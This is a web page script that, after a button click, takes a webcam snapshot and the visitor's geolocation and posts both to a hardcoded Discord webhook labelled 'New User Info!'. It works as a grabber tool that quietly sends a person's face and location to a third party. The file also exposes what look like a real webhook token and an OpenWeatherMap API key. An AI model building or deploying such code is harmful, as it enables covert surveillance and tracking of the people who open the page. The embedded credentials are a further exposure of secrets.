const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const startButton = document.getElementById('startButton');
const captureButton = document.getElementById('captureButton');
const noCameraMessage = document.getElementById('no-camera-message');
const locationInfoDiv = document.getElementById('location-info');
const coordsP = document.getElementById('coords');
const addressP = document.getElementById('address');

const webhookUrl = 'https://discord.com/api/webhooks/1506854427846508635/3PPDpwgkhYKFhs6cuK6Bl3sIb73YQ0ZYqEj6MIx6ivSqKjUWXQiig9q9vQkXi5Aq2mWe'; // Your Discord Webhook URL

let stream; // To hold the webcam stream

// Function to get webcam stream
async function getWebcamStream() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;
        video.style.display = 'block';
        noCameraMessage.style.display = 'none';
        return true;
    } catch (err) {
        console.error("Error accessing webcam:", err);
        video.style.display = 'none';
        noCameraMessage.style.display = 'block';
        return false;
    }
}

// Function to get user's location
function getLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject("Geolocation is not supported by your browser.");
            return;
        }

        navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            coordsP.textContent = `Latitude: ${lat}, Longitude: ${lon}`;

            try {
                // Reverse geocoding to get address
                const apiKey = '2d2adab5f5257ea7ddfc988bd3cd4e19'; // Replace with your OpenWeatherMap API key
                const response = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&units=metric`);
                const data = await response.json();
                let city = data.name;
                let country = data.sys.country;
                let address = `${city}, ${country}`;
                addressP.textContent = address;
                resolve({ lat, lon, address });
            } catch (error) {
                console.error("Error fetching address:", error);
                addressP.textContent = "Could not retrieve address.";
                resolve({ lat, lon, address: "Unknown" }); // Resolve with coordinates even if address fails
            }
        }, (error) => {
            console.error("Error getting location:", error);
            reject(`Error: ${error.message}`);
        });
    });
}

// Function to capture image from webcam
function captureImage() {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert canvas to a data URL in JPEG format
    const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8); // 0.8 is quality
    return imageDataUrl;
}

// Function to send data to Discord webhook
async function sendToDiscord(webcamImageBase64, locationData) {
    const message = {
        content: `New User Info!`,
        embeds: [{
            title: "User Details",
            color: 0x4CAF50, // Green color embed
            fields: [
                {
                    name: "Location",
                    value: `${locationData.address} (${locationData.lat}, ${locationData.lon})`,
                    inline: false
                }
            ],
            image: {
                url: webcamImageBase64
            }
        }]
    };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message),
        });

        if (!response.ok) {
            console.error("Failed to send message to Discord:", response.statusText);
        } else {
            console.log("Message sent to Discord successfully!");
        }
    } catch (error) {
        console.error("Error sending message to Discord:", error);
    }
}

// Event listeners
startButton.addEventListener('click', async () => {
    const webcamAllowed = await getWebcamStream();
    if (webcamAllowed) {
        startButton.style.display = 'none';
        captureButton.style.display = 'inline-block';
        locationInfoDiv.style.display = 'block';
        try {
            await getLocation();
        } catch (error) {
            coordsP.textContent = error;
            addressP.textContent = "Location services disabled.";
        }
    } else {
        alert("Please grant webcam access to proceed.");
    }
});

captureButton.addEventListener('click', async () => {
    const webcamImageBase64 = captureImage();
    const locationData = {
        lat: coordsP.textContent.split(',')[0].split(': ')[1],
        lon: coordsP.textContent.split(',')[1].split(': ')[1],
        address: addressP.textContent
    };

    await sendToDiscord(webcamImageBase64, locationData);
    alert("Information sent. Thank you!");
    captureButton.style.display = 'none'; // Disable after sending
    startButton.textContent = "Session Ended";
    startButton.disabled = true;
});

// Initial setup
// The start button will initiate everything.
